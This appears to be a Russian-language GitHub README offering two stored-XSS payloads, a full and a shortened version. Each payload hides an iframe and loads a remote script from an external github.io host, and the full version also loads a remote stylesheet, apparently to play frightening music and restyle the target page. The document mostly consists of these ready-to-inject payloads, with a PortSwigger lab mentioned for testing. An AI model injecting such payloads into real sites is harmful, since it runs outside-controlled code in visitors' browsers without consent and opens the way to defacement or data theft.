# Stored-XSS-scary

Код сработает только при наличии уязвимости хранимый XSS + если сайт не будет блокировать загрузку внешних скриптов и стилей. <br>
Для теста можно запустить лабараторку в https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded.
<br>
https://github.com/0-DAyFF13R/Stored-XSS-scary/assets/63510648/918e3044-14b0-45c1-aa3c-c795c30caf6f
<br>
------------------------------------------

Полная версия (музыка + CSS) [445 символов]:
> <script>var f=document.createElement("iframe");f.src="/css/bootstrap.min.css";document.body.appendChild(f);f.onload=function(){var s=document.createElement('script');s.src='//0-dayff13r.github.io/Stored-XSS-scary/start.js';f.contentWindow.document.head.appendChild(s);var c=document.createElement('link');c.rel='stylesheet';c.href='//0-dayff13r.github.io/Stored-XSS-scary/styles.css';document.head.appendChild(c)};f.style.display="none"</script>

<br> Сокращенная версия (только музыка) [300 символов]:
> <script>var f=document.createElement("iframe");f.src="/css/bootstrap.min.css";document.body.appendChild(f);f.onload=function(){var s=document.createElement('script');s.src='//0-dayff13r.github.io/Stored-XSS-scary/start.js';f.contentWindow.document.head.appendChild(s)};f.style.display="none"</script>
